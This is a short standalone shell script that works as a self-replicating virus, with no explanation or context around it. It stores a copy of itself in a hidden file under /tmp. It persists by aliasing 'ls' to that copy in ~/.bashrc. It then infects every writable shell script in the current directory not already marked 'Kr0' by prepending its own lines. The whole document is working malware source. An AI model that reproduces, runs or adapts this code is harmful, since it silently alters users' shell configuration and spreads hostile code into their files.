#!/bin/sh
#Kr0
v=/tmp/.vx
if (! grep $v ~/.bashrc && [ ! -f $v ]) >/dev/null;then
(head -n 15 $0 && echo "/bin/ls \$*") >$v
chmod +x $v
echo "alias ls='$v'" >>~/.bashrc;fi
for f in *
do
if (file $f |grep shell && [ -f $f -a -w $f ] && ! head -n 2 $f |grep Kr0) >/dev/null;then
cat $f >.a
head -n 15 $0 > $f
cat .a >>$f
rm -f .a
fi;done